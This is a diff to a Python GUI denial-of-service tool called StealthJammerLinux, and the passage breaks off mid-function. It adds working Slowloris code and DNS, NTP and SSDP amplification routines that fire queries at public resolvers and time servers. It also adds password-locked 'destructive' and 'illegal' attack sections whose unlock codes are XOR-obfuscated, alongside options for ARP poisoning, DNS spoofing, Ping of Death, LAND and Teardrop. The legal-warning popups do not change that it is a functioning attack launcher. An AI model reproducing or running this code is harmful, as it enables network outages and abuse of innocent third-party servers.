@@ -93,6 +93,22 @@ class StealthJammerLinux(tk.Tk):
         self.dns_spoof_enabled = False
         self.syn_flood_raw = False
         
+        # Secret unlock for destructive attacks
+        self.destructive_unlocked = False
+        self.secret_sequence = []
+        # Obfuscated code - XOR with 5 to hide the real values
+        _enc = [2, 6, 7, 12, 4, 1, 13, 3]
+        self.secret_code = [x ^ 5 for x in _enc]  # Decode at runtime
+        self.failed_attempts = 0
+        
+        # Secret unlock for amplification (illegal) attacks
+        self.amplification_unlocked = False
+        self.amp_sequence = []
+        # Different obfuscation - XOR with 7
+        _amp_enc = [6, 7, 4, 0, 2, 6]
+        self.amp_code = [x ^ 7 for x in _amp_enc]  # Decode at runtime
+        self.amp_failed_attempts = 0
+        
         # Check for root privileges
         self.is_root = self.check_root()
         
@@ -169,10 +185,22 @@ class StealthJammerLinux(tk.Tk):
         right_canvas.grid(row=0, column=1, sticky='nsew', padx=(5, 10), pady=10)
         right_scrollbar.grid(row=0, column=1, sticky='nse', padx=(0, 10))
         
-        # Mouse wheel scrolling
-        def _on_mousewheel(event, canvas):
-            canvas.yview_scroll(int(-1*(event.delta/120)), "units")
+        # Mouse wheel scrolling - bind to each canvas separately
+        def scroll_left(event):
+            left_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
+            return "break"
         
+        def scroll_right(event):
+            right_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
+            return "break"
+        
+        # Bind mouse wheel to canvases when mouse enters
+        left_canvas.bind("<Enter>", lambda e: left_canvas.bind_all("<MouseWheel>", scroll_left))
+        left_canvas.bind("<Leave>", lambda e: left_canvas.unbind_all("<MouseWheel>"))
+        right_canvas.bind("<Enter>", lambda e: right_canvas.bind_all("<MouseWheel>", scroll_right))
+        right_canvas.bind("<Leave>", lambda e: right_canvas.unbind_all("<MouseWheel>"))
+        
+        # Linux mouse wheel support (Button-4/5)
         left_canvas.bind_all("<Button-4>", lambda e: left_canvas.yview_scroll(-1, "units"))
         left_canvas.bind_all("<Button-5>", lambda e: left_canvas.yview_scroll(1, "units"))
         right_canvas.bind_all("<Button-4>", lambda e: right_canvas.yview_scroll(-1, "units"))
@@ -269,6 +297,10 @@ class StealthJammerLinux(tk.Tk):
         arp_frame = ttk.Frame(linux_frame)
         arp_frame.pack(fill='x', pady=5)
         ttk.Label(arp_frame, text="ARP Cache Poisoning", font=('Courier', 10)).pack(side='left')
+        tk.Button(arp_frame, text="[?]", font=('Courier', 7), bg='#330000', fg='#ff6666',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("ARP Poisoning (ROOT+SCAPY)", 
+                 "Poisons ARP cache to intercept/redirect traffic.\nMan-in-the-middle attack. Requires root + scapy.")).pack(side='left', padx=3)
         self.arp_var = tk.BooleanVar(value=False)
         arp_check = ttk.Checkbutton(arp_frame, variable=self.arp_var,
                                    command=self.on_arp_toggle,
@@ -279,6 +311,10 @@ class StealthJammerLinux(tk.Tk):
         dns_frame = ttk.Frame(linux_frame)
         dns_frame.pack(fill='x', pady=5)
         ttk.Label(dns_frame, text="DNS Response Spoofing", font=('Courier', 10)).pack(side='left')
+        tk.Button(dns_frame, text="[?]", font=('Courier', 7), bg='#330000', fg='#ff6666',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("DNS Spoofing (ROOT+SCAPY)", 
+                 "Sends fake DNS responses to redirect domains.\nRequires root + scapy.")).pack(side='left', padx=3)
         self.dns_var = tk.BooleanVar(value=False)
         dns_check = ttk.Checkbutton(dns_frame, variable=self.dns_var,
                                    command=self.on_dns_toggle,
@@ -289,11 +325,45 @@ class StealthJammerLinux(tk.Tk):
         syn_frame = ttk.Frame(linux_frame)
         syn_frame.pack(fill='x', pady=5)
         ttk.Label(syn_frame, text="Raw SYN Flood (TCP Header Craft)", font=('Courier', 10)).pack(side='left')
+        tk.Button(syn_frame, text="[?]", font=('Courier', 7), bg='#330000', fg='#ff6666',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("Raw TCP SYN (ROOT)", 
+                 "Manually crafts TCP/IP headers with raw sockets.\nBypasses OS TCP stack. Requires root.")).pack(side='left', padx=3)
         self.syn_raw_var = tk.BooleanVar(value=False)
         syn_check = ttk.Checkbutton(syn_frame, variable=self.syn_raw_var,
                                     command=self.on_syn_raw_toggle,
                                     state='normal' if self.is_root else 'disabled')
         syn_check.pack(side='right')
+        
+        # Quick Mode Selector (Terminal tab-style)
+        mode_selector_frame = ttk.Frame(left_column)
+        mode_selector_frame.pack(fill='x', pady=(0, 10))
+        
+        ttk.Label(mode_selector_frame, text="[QUICK MODE]", font=('Courier', 9, 'bold')).pack(anchor='w', pady=(0, 5))
+        
+        mode_buttons_frame = ttk.Frame(mode_selector_frame)
+        mode_buttons_frame.pack(fill='x')
+        
+        self.mode_safe_btn = tk.Button(mode_buttons_frame, text="[⚡ NO ROOT]",
+                                       command=self.set_safe_mode,
+                                       bg='#003300', fg=self.accent_color, font=('Courier', 8, 'bold'),
+                                       relief='ridge', bd=2, cursor='hand2', height=2,
+                                       activebackground='#005500')
+        self.mode_safe_btn.pack(side='left', padx=2, expand=True, fill='both')
+        
+        self.mode_full_btn = tk.Button(mode_buttons_frame, text="[🔥 ROOT]",
+                                       command=self.set_full_mode,
+                                       bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'),
+                                       relief='ridge', bd=2, cursor='hand2', height=2,
+                                       activebackground='#003300')
+        self.mode_full_btn.pack(side='left', padx=2, expand=True, fill='both')
+        
+        self.mode_custom_btn = tk.Button(mode_buttons_frame, text="[⚙️ CUSTOM]",
+                                         command=self.set_custom_mode,
+                                         bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'),
+                                         relief='ridge', bd=2, cursor='hand2', height=2,
+                                         activebackground='#003300')
+        self.mode_custom_btn.pack(side='left', padx=2, expand=True, fill='both')
         
         # Attack Controls (same as Windows but with terminal theme)
         attack_frame = ttk.LabelFrame(left_column, text="[ATTACK CONTROLS]", padding=15)
@@ -345,14 +415,187 @@ class StealthJammerLinux(tk.Tk):
         vectors_frame = ttk.Frame(attack_frame)
         vectors_frame.pack(fill='x', padx=10)
         
+        # === STANDARD ATTACKS ===
+        standard_label_frame = ttk.Frame(attack_frame)
+        standard_label_frame.pack(fill='x', padx=10, pady=(5, 2))
+        ttk.Label(standard_label_frame, text="[⚡ STANDARD ATTACKS]", 
+                 font=('Courier', 9, 'bold'), foreground='#00ff00').pack(side='left')
+        ttk.Label(standard_label_frame, text="(No Root Required)", 
+                 font=('Courier', 8), foreground='#00aa00').pack(side='left', padx=5)
+        
+        # UDP Flood
+        udp_frame = ttk.Frame(vectors_frame)
+        udp_frame.pack(fill='x', pady=2)
         self.vector_udp_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(vectors_frame, text="[*] UDP Flood", variable=self.vector_udp_var).pack(anchor='w', pady=3)
+        ttk.Checkbutton(udp_frame, text="[*] UDP Flood", variable=self.vector_udp_var).pack(side='left')
+        tk.Button(udp_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("UDP Flood", "Floods target with UDP packets. High bandwidth saturation.")).pack(side='left', padx=5)
         
+        # TCP SYN Flood
+        tcp_frame = ttk.Frame(vectors_frame)
+        tcp_frame.pack(fill='x', pady=2)
         self.vector_tcp_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(vectors_frame, text="[*] TCP SYN Flood", variable=self.vector_tcp_var).pack(anchor='w', pady=3)
+        ttk.Checkbutton(tcp_frame, text="[*] TCP SYN Flood", variable=self.vector_tcp_var).pack(side='left')
+        tk.Button(tcp_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("TCP SYN Flood", "Exhausts connection table with half-open TCP connections.")).pack(side='left', padx=5)
         
+        # Broadcast Storm
+        bcast_frame = ttk.Frame(vectors_frame)
+        bcast_frame.pack(fill='x', pady=2)
         self.vector_broadcast_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(vectors_frame, text="[*] Broadcast Storm", variable=self.vector_broadcast_var).pack(anchor='w', pady=3)
+        ttk.Checkbutton(bcast_frame, text="[*] Broadcast Storm", variable=self.vector_broadcast_var).pack(side='left')
+        tk.Button(bcast_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("Broadcast Storm", "Floods entire network segment with broadcast packets.")).pack(side='left', padx=5)
+        
+        # Slowloris Attack
+        slow_frame = ttk.Frame(vectors_frame)
+        slow_frame.pack(fill='x', pady=2)
+        self.vector_slowloris_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(slow_frame, text="[*] Slowloris", variable=self.vector_slowloris_var).pack(side='left')
+        tk.Button(slow_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("Slowloris", "Opens hundreds of connections and keeps them alive with partial HTTP headers. Exhausts web servers.")).pack(side='left', padx=5)
+        
+        # Separator
+        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
+        
+        # === AMPLIFICATION ATTACKS (Malicious - Reflects through 3rd parties) ===
+        amp_section_frame = ttk.Frame(attack_frame)
+        amp_section_frame.pack(fill='x', padx=10, pady=5)
+        
+        amplification_label_frame = ttk.Frame(amp_section_frame)
+        amplification_label_frame.pack(fill='x', pady=(5, 2))
+        ttk.Label(amplification_label_frame, text="[⚠ AMPLIFICATION ATTACKS]", 
+                 font=('Courier', 9, 'bold'), foreground='#ffaa00').pack(side='left')
+        ttk.Label(amplification_label_frame, text="(ILLEGAL - Reflects via 3rd parties)", 
+                 font=('Courier', 8), foreground='#ff5500').pack(side='left', padx=5)
+        
+        # Amplification unlock section
+        amp_unlock_frame = ttk.Frame(amp_section_frame)
+        amp_unlock_frame.pack(fill='x', pady=5)
+        
+        self.amp_unlock_label = ttk.Label(amp_unlock_frame, text="[LOCKED] Type Password:", 
+                                         font=('Courier', 9, 'bold'), foreground='#ffaa00')
+        self.amp_unlock_label.pack(side='left')
+        
+        # Password entry field for amplification unlock
+        self.amp_entry_var = tk.StringVar()
+        self.amp_entry = tk.Entry(amp_unlock_frame, textvariable=self.amp_entry_var, 
+                                 show="*", width=10, font=('Courier', 12, 'bold'),
+                                 bg='#221100', fg='#ffaa00', insertbackground='#ffaa00',
+                                 relief='flat', justify='center')
+        self.amp_entry.pack(side='left', padx=10)
+        self.amp_entry.bind('<Return>', lambda e: self.check_amp_password())
+        self.amp_entry.bind('<KeyRelease>', self.on_amp_entry_change)
+        
+        # Amplification attacks container (hidden until unlocked)
+        self.amplification_container = ttk.Frame(amp_section_frame)
+        # Don't pack yet - will pack when unlocked
+        
+        # DNS Amplification
+        dns_frame = ttk.Frame(self.amplification_container)
+        dns_frame.pack(fill='x', pady=2)
+        self.vector_dns_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(dns_frame, text="[*] DNS Amplification (70x)", variable=self.vector_dns_var).pack(side='left')
+        tk.Button(dns_frame, text="[?]", font=('Courier', 7), bg='#221100', fg='#ffaa00',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("DNS Amplification", "Uses public DNS servers to amplify traffic 70x. Reflects to target. ILLEGAL!")).pack(side='left', padx=5)
+        
+        # NTP Amplification
+        ntp_frame = ttk.Frame(self.amplification_container)
+        ntp_frame.pack(fill='x', pady=2)
+        self.vector_ntp_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(ntp_frame, text="[*] NTP Amplification (556x)", variable=self.vector_ntp_var).pack(side='left')
+        tk.Button(ntp_frame, text="[?]", font=('Courier', 7), bg='#221100', fg='#ffaa00',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("NTP Amplification", "Exploits NTP monlist command. 556x amplification factor! ILLEGAL!")).pack(side='left', padx=5)
+        
+        # SSDP Amplification
+        ssdp_frame = ttk.Frame(self.amplification_container)
+        ssdp_frame.pack(fill='x', pady=2)
+        self.vector_ssdp_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(ssdp_frame, text="[*] SSDP Amplification (30x)", variable=self.vector_ssdp_var).pack(side='left')
+        tk.Button(ssdp_frame, text="[?]", font=('Courier', 7), bg='#221100', fg='#ffaa00',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("SSDP Amplification", "Exploits UPnP discovery. Reflects off IoT devices. 30x amplification. ILLEGAL!")).pack(side='left', padx=5)
+        
+        # Separator
+        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
+        
+        # === DESTRUCTIVE ATTACKS (Requires Root - Can Crash Systems) ===
+        destructive_section_frame = ttk.Frame(attack_frame)
+        destructive_section_frame.pack(fill='x', padx=10, pady=5)
+        
+        destructive_label_frame = ttk.Frame(destructive_section_frame)
+        destructive_label_frame.pack(fill='x', pady=(5, 2))
+        ttk.Label(destructive_label_frame, text="[☠ DESTRUCTIVE ATTACKS]", 
+                 font=('Courier', 9, 'bold'), foreground='#ff0000').pack(side='left')
+        ttk.Label(destructive_label_frame, text="(Requires Root - Can CRASH systems)", 
+                 font=('Courier', 8), foreground='#cc0000').pack(side='left', padx=5)
+        
+        # Destructive unlock section
+        dest_unlock_frame = ttk.Frame(destructive_section_frame)
+        dest_unlock_frame.pack(fill='x', pady=5)
+        
+        self.unlock_label = ttk.Label(dest_unlock_frame, text="[LOCKED] Type Password:", 
+                                     font=('Courier', 9, 'bold'), foreground='#ff0000')
+        self.unlock_label.pack(side='left')
+        
+        # Password entry field for destructive unlock
+        self.dest_entry_var = tk.StringVar()
+        self.dest_entry = tk.Entry(dest_unlock_frame, textvariable=self.dest_entry_var, 
+                                  show="*", width=12, font=('Courier', 12, 'bold'),
+                                  bg='#220000', fg='#ff6666', insertbackground='#ff6666',
+                                  relief='flat', justify='center')
+        self.dest_entry.pack(side='left', padx=10)
+        self.dest_entry.bind('<Return>', lambda e: self.check_dest_password())
+        self.dest_entry.bind('<KeyRelease>', self.on_dest_entry_change)
+        
+        # Destructive attacks container (hidden until unlocked)
+        self.destructive_container = ttk.Frame(destructive_section_frame)
+        # Don't pack yet - will pack when unlocked
+        
+        # IP Fragmentation Bomb
+        frag_frame = ttk.Frame(self.destructive_container)
+        frag_frame.pack(fill='x', pady=2)
+        self.vector_fragmentation_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(frag_frame, text="[*] IP Fragmentation Bomb", variable=self.vector_fragmentation_var).pack(side='left')
+        tk.Button(frag_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("Fragmentation Bomb (ROOT)", "Sends malformed overlapping fragments. Crashes routers/firewalls. Requires root.")).pack(side='left', padx=5)
+        
+        # Ping of Death
+        pod_frame = ttk.Frame(self.destructive_container)
+        pod_frame.pack(fill='x', pady=2)
+        self.vector_ping_death_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(pod_frame, text="[*] Ping of Death", variable=self.vector_ping_death_var).pack(side='left')
+        tk.Button(pod_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("Ping of Death (ROOT)", "Sends oversized ICMP packets (>65KB). Crashes legacy systems. Requires root.")).pack(side='left', padx=5)
+        
+        # LAND Attack
+        land_frame = ttk.Frame(self.destructive_container)
+        land_frame.pack(fill='x', pady=2)
+        self.vector_land_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(land_frame, text="[*] LAND Attack", variable=self.vector_land_var).pack(side='left')
+        tk.Button(land_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("LAND Attack (ROOT)", "Source IP = Destination IP. Creates infinite loops, freezes systems. Requires root.")).pack(side='left', padx=5)
+        
+        # Teardrop Attack
+        tear_frame = ttk.Frame(self.destructive_container)
+        tear_frame.pack(fill='x', pady=2)
+        self.vector_teardrop_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(tear_frame, text="[*] Teardrop Attack", variable=self.vector_teardrop_var).pack(side='left')
+        tk.Button(tear_frame, text="[?]", font=('Courier', 7), bg='#220000', fg='#ff6666',
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("Teardrop (ROOT)", "Overlapping IP fragments. Crashes systems on reassembly. Requires root.")).pack(side='left', padx=5)
+        
+        # Separator
+        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
         
         # Advanced Configuration
         advanced_frame = ttk.LabelFrame(left_column, text="[ADVANCED CONFIGURATION]", padding=15)
@@ -921,11 +1164,192 @@ class StealthJammerLinux(tk.Tk):
         self.intensity_var.set(level)
         self.on_intensity_changed(None)
     
+    def set_safe_mode(self):
+        """Enable only non-root attack vectors"""
+        # Highlight active tab
+        self.mode_safe_btn.config(bg='#003300', relief='ridge')
+        self.mode_full_btn.config(bg='#001100', relief='ridge')
+        self.mode_custom_btn.config(bg='#001100', relief='ridge')
+        
+        # Enable safe vectors (no root required)
+        self.vector_udp_var.set(True)
+        self.vector_tcp_var.set(True)
+        self.vector_broadcast_var.set(True)
+        
+        # Disable root-required vectors
+        self.syn_raw_var.set(False)
+        self.arp_poison_var.set(False)
+        self.dns_spoof_var.set(False)
+        
+        self.log_message("[MODE] No Root Required - Safe vectors enabled", "SUCCESS")
+    
+    def set_full_mode(self):
+        """Enable all attack vectors"""
+        # Highlight active tab
+        self.mode_safe_btn.config(bg='#001100', relief='ridge')
+        self.mode_full_btn.config(bg='#330000', relief='ridge')
+        self.mode_custom_btn.config(bg='#001100', relief='ridge')
+        
+        # Enable all vectors
+        self.vector_udp_var.set(True)
+        self.vector_tcp_var.set(True)
+        self.vector_broadcast_var.set(True)
+        self.syn_raw_var.set(True)
+        self.arp_poison_var.set(True)
+        self.dns_spoof_var.set(True)
+        
+        if not self.is_root:
+            self.log_message("[MODE] Full Arsenal - WARNING: Root required for some vectors!", "WARNING")
+        else:
+            self.log_message("[MODE] Full Arsenal - All vectors enabled", "ATTACK")
+    
+    def set_custom_mode(self):
+        """Set custom mode - user controls vectors manually"""
+        # Highlight active tab
+        self.mode_safe_btn.config(bg='#001100', relief='ridge')
+        self.mode_full_btn.config(bg='#001100', relief='ridge')
+        self.mode_custom_btn.config(bg='#003333', relief='ridge')
+        
+        self.log_message("[MODE] Custom - Manual vector selection", "INFO")
+    
+    def show_info(self, title, message):
+        """Show info popup for attack vectors"""
+        import tkinter.messagebox as msgbox
+        msgbox.showinfo(title, message)
+    
+    def on_amp_entry_change(self, event=None):
+        """Handle amplification password entry changes"""
+        if self.amp_failed_attempts >= 3:
+            self.amp_entry_var.set("")
+            return
+        
+        # Limit to digits only
+        current = self.amp_entry_var.get()
+        filtered = ''.join(filter(str.isdigit, current))
+        if filtered != current:
+            self.amp_entry_var.set(filtered)
+    
+    def check_amp_password(self):
+        """Check amplification password"""
+        if self.amp_failed_attempts >= 3:
+            return
+        
+        entered = self.amp_entry_var.get()
+        if not entered:
+            return
+        
+        entered_code = [int(d) for d in entered]
+        
+        if entered_code == self.amp_code:
+            self.unlock_amplification_attacks()
+        else:
+            self.amp_failed_attempts += 1
+            remaining = 3 - self.amp_failed_attempts
+            
+            if self.amp_failed_attempts >= 3:
+                self.activity_log.insert('1.0', f"[LOCKOUT] Amplification: Maximum attempts exceeded. Restart required.\n", 'error')
+                self.amp_unlock_label.config(text="[LOCKED]", foreground='#ff0000')
+                self.amp_entry.config(state='disabled', bg='#0a0a0a')
+            else:
+                self.activity_log.insert('1.0', f"[WARN] Wrong amplification password! {remaining} attempt(s) remaining.\n", 'warning')
+                self.amp_entry.config(bg='#330000')
+                self.after(200, lambda: self.amp_entry.config(bg='#221100'))
+            
+            self.amp_entry_var.set("")
+    
+    def on_dest_entry_change(self, event=None):
+        """Handle destructive password entry changes"""
+        if self.failed_attempts >= 3:
+            self.dest_entry_var.set("")
+            return
+        
+        # Limit to digits only
+        current = self.dest_entry_var.get()
+        filtered = ''.join(filter(str.isdigit, current))
+        if filtered != current:
+            self.dest_entry_var.set(filtered)
+    
+    def check_dest_password(self):
+        """Check destructive password"""
+        if self.failed_attempts >= 3:
+            return
+        
+        entered = self.dest_entry_var.get()
+        if not entered:
+            return
+        
+        entered_code = [int(d) for d in entered]
+        
+        if entered_code == self.secret_code:
+            self.unlock_destructive_attacks()
+        else:
+            self.failed_attempts += 1
+            remaining = 3 - self.failed_attempts
+            
+            if self.failed_attempts >= 3:
+                self.activity_log.insert('1.0', f"[LOCKOUT] Destructive: Maximum attempts exceeded. Restart required.\n", 'error')
+                self.unlock_label.config(text="[LOCKED]", foreground='#ff0000')
+                self.dest_entry.config(state='disabled', bg='#0a0a0a')
+            else:
+                self.activity_log.insert('1.0', f"[WARN] Wrong destructive password! {remaining} attempt(s) remaining.\n", 'warning')
+                self.dest_entry.config(bg='#330000')
+                self.after(200, lambda: self.dest_entry.config(bg='#220000'))
+            
+            self.dest_entry_var.set("")
+    
+    def unlock_amplification_attacks(self):
+        """Unlock and show amplification attacks"""
+        self.amplification_unlocked = True
+        self.amp_unlock_label.config(text="[UNLOCKED]", foreground='#00ff00')
+        self.amp_entry.config(state='disabled', show="", bg='#001a00')
+        self.amp_entry_var.set("UNLOCKED")
+        
+        # Show warning popup
+        messagebox.showwarning("[LEGAL WARNING]", 
+                              "[AMPLIFICATION ATTACKS UNLOCKED]\n\n"
+                              "These attacks are ILLEGAL:\n"
+                              "• Violate computer fraud laws\n"
+                              "• Constitute network abuse\n"
+                              "• Reflect through innocent 3rd parties\n"
+                              "• Can result in criminal prosecution\n\n"
+                              "Use ONLY in authorized test environments.\n"
+                              "You assume ALL legal responsibility.")
+        
+        # Show amplification attacks container
+        self.amplification_container.pack(fill='x', pady=10)
+        
+        self.activity_log.insert('1.0', "[WARN] AMPLIFICATION ATTACKS UNLOCKED - Illegal in most jurisdictions!\n", 'warning')
+    
+    def unlock_destructive_attacks(self):
+        """Unlock and show destructive attacks"""
+        self.destructive_unlocked = True
+        self.unlock_label.config(text="[UNLOCKED]", foreground='#00ff00')
+        self.dest_entry.config(state='disabled', show="", bg='#001a00')
+        self.dest_entry_var.set("UNLOCKED")
+        
+        # Show warning popup
+        messagebox.showwarning("[WARNING]", 
+                              "[DESTRUCTIVE ATTACKS UNLOCKED]\n\n"
+                              "These attacks can:\n"
+                              "• Crash network devices\n"
+                              "• Cause system instability\n"
+                              "• Require root privileges\n"
+                              "• Violate laws and regulations\n\n"
+                              "Use ONLY in authorized test environments.\n"
+                              "You assume ALL legal responsibility.")
+        
+        # Show destructive attacks container
+        self.destructive_container.pack(fill='x', pady=10)
+        
+        self.activity_log.insert('1.0', "[WARN] DESTRUCTIVE ATTACKS UNLOCKED - Use with extreme caution!\n", 'warning')
+    
     def on_intensity_changed(self, event):
         """Handle intensity slider change"""
         self.intensity = int(self.intensity_var.get())
         percent = self.intensity * 10
         self.intensity_label.config(text=f"Level {self.intensity} ({percent}%)")
+        # Switch to custom mode when user adjusts settings
+        self.set_custom_mode()
     
     def on_attack_toggle(self):
         """Toggle attack on/off"""
@@ -987,6 +1411,76 @@ class StealthJammerLinux(tk.Tk):
                 t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                 t.start()
                 self.attack_threads.append(t)
+        
+        if self.vector_slowloris_var.get():
+            active_vectors.append("Slowloris")
+            for _ in range(num_threads // 2):  # Fewer threads for connection-based attack
+                t = threading.Thread(target=self.slowloris_attack, daemon=True)
+                t.start()
+                self.attack_threads.append(t)
+        
+        # Amplification attacks (require password unlock)
+        if self.vector_dns_var.get() and self.amplification_unlocked:
+            active_vectors.append("DNS Amplification")
+            for _ in range(num_threads):
+                t = threading.Thread(target=self.dns_amplification_attack, daemon=True)
+                t.start()
+                self.attack_threads.append(t)
+        
+        if self.vector_ntp_var.get() and self.amplification_unlocked:
+            active_vectors.append("NTP Amplification")
+            for _ in range(num_threads):
+                t = threading.Thread(target=self.ntp_amplification_attack, daemon=True)
+                t.start()
+                self.attack_threads.append(t)
+        
+        if self.vector_ssdp_var.get() and self.amplification_unlocked:
+            active_vectors.append("SSDP Amplification")
+            for _ in range(num_threads):
+                t = threading.Thread(target=self.ssdp_amplification_attack, daemon=True)
+                t.start()
+                self.attack_threads.append(t)
+        
+        # Destructive attacks (require password unlock AND root)
+        if self.vector_fragmentation_var.get() and self.destructive_unlocked:
+            if self.is_root:
+                active_vectors.append("Fragmentation Bomb")
+                for _ in range(num_threads):
+                    t = threading.Thread(target=self.fragmentation_attack, daemon=True)
+                    t.start()
+                    self.attack_threads.append(t)
+            else:
+                self.log_message("[WARN] Fragmentation Bomb requires root privileges", "WARNING")
+        
+        if self.vector_ping_death_var.get() and self.destructive_unlocked:
+            if self.is_root:
+                active_vectors.append("Ping of Death")
+                for _ in range(num_threads):
+                    t = threading.Thread(target=self.ping_of_death_attack, daemon=True)
+                    t.start()
+                    self.attack_threads.append(t)
+            else:
+                self.log_message("[WARN] Ping of Death requires root privileges", "WARNING")
+        
+        if self.vector_land_var.get() and self.destructive_unlocked:
+            if self.is_root:
+                active_vectors.append("LAND Attack")
+                for _ in range(num_threads):
+                    t = threading.Thread(target=self.land_attack, daemon=True)
+                    t.start()
+                    self.attack_threads.append(t)
+            else:
+                self.log_message("[WARN] LAND Attack requires root privileges", "WARNING")
+        
+        if self.vector_teardrop_var.get() and self.destructive_unlocked:
+            if self.is_root:
+                active_vectors.append("Teardrop Attack")
+                for _ in range(num_threads):
+                    t = threading.Thread(target=self.teardrop_attack, daemon=True)
+                    t.start()
+                    self.attack_threads.append(t)
+            else:
+                self.log_message("[WARN] Teardrop Attack requires root privileges", "WARNING")
         
         # Linux-specific attack vectors
         if self.arp_poison_enabled and self.is_root and self.scapy_available:
@@ -1201,6 +1695,320 @@ class StealthJammerLinux(tk.Tk):
             sock.close()
         except:
             pass
+    
+    def slowloris_attack(self):
+        """Slowloris attack - keeps connections open with partial HTTP headers"""
+        connections = []
+        try:
+            # Open multiple connections
+            for _ in range(100):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(4)
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    sock.connect((target, 80))
+                    sock.send(b"GET / HTTP/1.1\r\n")
+                    sock.send(f"Host: {target}\r\n".encode())
+                    connections.append(sock)
+                    self.packets_sent += 1
+                    self.bytes_sent += 50
+                except:
+                    pass
+            
+            # Keep connections alive
+            while self.attack_active and connections:
+                for sock in connections[:]:
+                    try:
+                        sock.send(b"X-a: b\r\n")
+                        self.packets_sent += 1
+                        self.bytes_sent += 10
+                    except:
+                        connections.remove(sock)
+                time.sleep(10)
+        except:
+            pass
+        finally:
+            for sock in connections:
+                try:
+                    sock.close()
+                except:
+                    pass
+    
+    def dns_amplification_attack(self):
+        """DNS amplification attack - reflects through DNS servers"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # Public DNS servers to abuse
+            dns_servers = [
+                "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
+                "208.67.222.222", "208.67.220.220"
+            ]
+            
+            # DNS query for ANY record (large response)
+            query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + \
+                   b'\x03www\x07example\x03com\x00\x00\xff\x00\x01'
+            
+            while self.attack_active:
+                try:
+                    dns_server = random.choice(dns_servers)
+                    # Spoof source IP to reflect to target
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    sock.sendto(query, (dns_server, 53))
+                    
+                    self.packets_sent += 1
+                    self.bytes_sent += len(query) * 70  # 70x amplification
+                    
+                    time.sleep(1 / self.send_rate if self.send_rate > 0 else 0.001)
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def ntp_amplification_attack(self):
+        """NTP amplification attack - monlist command"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # NTP monlist query
+            ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
+            
+            # Public NTP servers (DO NOT USE IN PRODUCTION)
+            ntp_servers = [
+                "pool.ntp.org", "time.google.com", "time.cloudflare.com"
+            ]
+            
+            while self.attack_active:
+                try:
+                    ntp_server = random.choice(ntp_servers)
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    sock.sendto(ntp_query, (ntp_server, 123))
+                    
+                    self.packets_sent += 1
+                    self.bytes_sent += len(ntp_query) * 556  # 556x amplification
+                    
+                    time.sleep(1 / self.send_rate if self.send_rate > 0 else 0.001)
+                except:
+                    pass
+            
+            sock.close()
+        except:
+            pass
+    
+    def ssdp_amplification_attack(self):
+        """SSDP amplification attack - UPnP discovery"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # SSDP M-SEARCH request
+            ssdp_request = b'M-SEARCH * HTTP/1.1\r\n' + \
+                          b'HOST: 239.255.255.250:1900\r\n' + \
+                          b'MAN: "ssdp:discover"\r\n' + \
+                          b'MX: 2\r\n' + \
+                          b'ST: ssdp:all\r\n\r\n'
+            
+            while self.attack_active:
+                try:
+                    target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                    sock.sendto(ssdp_request, (target, 1900))
+                    
